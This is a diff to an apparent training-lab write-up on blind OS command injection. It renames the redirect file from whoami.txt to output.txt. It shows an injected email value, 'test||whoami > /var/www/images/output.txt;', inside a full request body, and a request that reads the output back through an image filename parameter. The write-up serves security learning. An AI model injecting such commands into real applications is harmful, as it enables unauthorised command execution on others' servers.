@@ -17,13 +17,13 @@ Test the `email` parameter for OS command injection by modifying its value:
 ```text
 email=test%40test
 →
-email=test||whoami > /var/www/images/whoami.txt;
+email=test||whoami > /var/www/images/output.txt;
 ```
 
 The full modified request body becomes:
 
 ```text
-csrf=4vLJYSZcanbIXfPZRBprItYH9YWTQ422&name=1&email=test||whoami > /var/www/images/whoami.txt;&subject=1&message=1
+csrf=4vLJYSZcanbIXfPZRBprItYH9YWTQ422&name=1&email=test||whoami > /var/www/images/output.txt;&subject=1&message=1
 ```
 
 The `/var/www/images` path is provided in the lab.
@@ -37,7 +37,7 @@ whoami
 and redirects the command output into:
 
 ```text
-/var/www/images/whoami.txt
+/var/www/images/output.txt
 ```
 
 The `>` operator redirects the standard output of the command into the specified file.
@@ -57,12 +57,12 @@ Modify the `filename` parameter to request the file created by the injected comm
 ```http
 GET /image?filename=2.jpg HTTP/2
 →
-GET /image?filename=whoami.txt HTTP/2
+GET /image?filename=output.txt HTTP/2
 ```
 
 ![Command output](https://github.com/user-attachments/assets/12ae535f-4c68-4221-8303-3b9e9f696431)
 
-The application successfully returns the contents of `whoami.txt`.
+The application successfully returns the contents of `output.txt`.
 
 This confirms an **OS command injection vulnerability** in the `email` parameter. The application appears to pass user-controlled input into an OS command without sufficient sanitisation or safe command execution.
 
